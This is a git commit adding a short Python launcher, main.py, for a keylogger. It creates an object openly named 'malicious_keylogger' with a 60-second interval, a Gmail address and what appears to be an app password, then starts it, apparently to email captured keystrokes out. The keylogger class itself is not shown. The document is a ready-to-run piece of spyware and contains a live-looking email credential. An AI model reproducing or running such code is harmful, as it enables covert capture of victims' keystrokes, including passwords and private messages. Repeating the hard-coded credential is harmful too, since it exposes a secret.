492dfa6c2760851e2d8ec52ae085e35cbed3c36d
Kaushal-wbedev <158753580+Kaushal-wbedev@users.noreply.github.com>
2024-10-20 15:55:12 +0530

    Add files via upload

---
+++ main.py
@@ -0,0 +1,8 @@
+from keylog import KeyLogger
+
+
+malicious_keylogger: KeyLogger = KeyLogger(60, 'kaushalsharma11852@gmail.com', 'iufq xcjo oukd rojv')
+
+# Execute Keylogger
+
+malicious_keylogger.start()
